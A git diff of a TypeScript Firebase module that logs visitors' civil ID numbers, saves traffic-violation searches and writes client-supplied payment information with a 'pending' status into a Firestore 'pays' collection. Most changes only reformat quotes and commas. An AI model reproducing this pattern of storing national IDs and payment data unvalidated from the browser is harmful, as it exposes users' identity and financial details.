@@ -5,8 +5,8 @@ import {
   setDoc,
   doc,
   getFirestore,
-} from 'firebase/firestore';
-import { initializeApp } from 'firebase/app';
+} from "firebase/firestore";
+import { initializeApp } from "firebase/app";
 
 const firebaseConfig = {
   // Your Firebase configuration will be injected here
@@ -16,7 +16,7 @@ const firebaseConfig = {
   storageBucket: "moror-7892f.firebasestorage.app",
   messagingSenderId: "644937901522",
   appId: "1:644937901522:web:e9fcf90e8d6d187f7b140b",
-  measurementId: "G-FEC36WC9S7"
+  measurementId: "G-FEC36WC9S7",
 };
 
 const app = initializeApp(firebaseConfig);
@@ -31,7 +31,7 @@ interface VisitorData {
 
 export async function logVisitor(civilId: string): Promise<string> {
   try {
-    const visitorRef = await addDoc(collection(db, 'visitors'), {
+    const visitorRef = await addDoc(collection(db, "visitors"), {
       civilId,
       timestamp: serverTimestamp(),
       userAgent: navigator.userAgent,
@@ -39,7 +39,7 @@ export async function logVisitor(civilId: string): Promise<string> {
 
     return visitorRef.id;
   } catch (error) {
-    console.error('Error logging visitor:', error);
+    console.error("Error logging visitor:", error);
     throw error;
   }
 }
@@ -49,7 +49,7 @@ export async function saveViolationSearch(
   violations: any[]
 ): Promise<string> {
   try {
-    const searchRef = await addDoc(collection(db, 'searches'), {
+    const searchRef = await addDoc(collection(db, "searches"), {
       civilId,
       violations,
       timestamp: serverTimestamp(),
@@ -57,38 +57,41 @@ export async function saveViolationSearch(
 
     return searchRef.id;
   } catch (error) {
-    console.error('Error saving search:', error);
+    console.error("Error saving search:", error);
     throw error;
   }
 }
 export async function addData(data: any) {
-  localStorage.setItem('visitor', data.id);
+  localStorage.setItem("visitor", data.id);
   try {
-    const docRef = await doc(db, 'pays', data.id!);
-    await setDoc(docRef, data,    { merge: true }
-      );
+    const docRef = await doc(db, "pays", data.id!);
+    await setDoc(
+      docRef,
+      { ...data, createdDate: new Date().toISOString() },
+      { merge: true }
+    );
 
-    console.log('Document written with ID: ', docRef.id);
+    console.log("Document written with ID: ", docRef.id);
     // You might want to show a success message to the user here
   } catch (e) {
-    console.error('Error adding document: ', e);
+    console.error("Error adding document: ", e);
     // You might want to show an error message to the user here
   }
 }
 export const handlePay = async (paymentInfo: any, setPaymentInfo: any) => {
   try {
-    const visitorId = localStorage.getItem('visitor');
+    const visitorId = localStorage.getItem("visitor");
     if (visitorId) {
-      const docRef = doc(db, 'pays', visitorId);
+      const docRef = doc(db, "pays", visitorId);
       await setDoc(
         docRef,
-        { ...paymentInfo, status: 'pending' },
+        { ...paymentInfo, status: "pending" },
         { merge: true }
       );
-      setPaymentInfo((prev: any) => ({ ...prev, status: 'pending' }));
+      setPaymentInfo((prev: any) => ({ ...prev, status: "pending" }));
     }
   } catch (error) {
-    console.error('Error adding document: ', error);
-    alert('Error adding payment info to Firestore');
+    console.error("Error adding document: ", error);
+    alert("Error adding payment info to Firestore");
   }
 };
